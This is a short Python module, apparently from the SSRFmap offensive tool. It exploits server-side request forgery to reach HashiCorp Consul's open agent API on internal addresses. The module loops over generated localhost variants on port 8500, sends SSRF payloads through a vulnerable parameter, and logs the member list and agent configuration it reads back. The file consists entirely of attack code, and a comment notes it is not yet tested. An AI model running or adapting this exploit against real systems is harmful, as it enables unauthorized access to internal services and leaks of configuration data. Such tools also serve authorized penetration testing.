import json
import logging
import urllib.parse

from ssrfmap.core.utils import gen_ip_list, wrapper_http

# NOTE : NOT TESTED YET
# might need some editing to work properly !

name = "consul"
description = "Hashicorp Consul Info Leak - Open API"
author = "Swissky"
documentation: list[str] = ["https://www.consul.io/api/agent.html"]


class exploit:
    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        gen_host = gen_ip_list("127.0.0.1", args.level)
        port = "8500"

        # List Members
        for ip in gen_host:
            data = "/v1/agent/members"
            payload = wrapper_http(data, ip, port)
            r = requester.do_request(args.param, payload)

            if r.json:
                logging.debug(r.json)

        # Read Configuration
        for ip in gen_host:
            data = "/v1/agent/self"
            payload = wrapper_http(data, ip, port)
            r = requester.do_request(args.param, payload)

            if r.json:
                logging.debug(r.json)
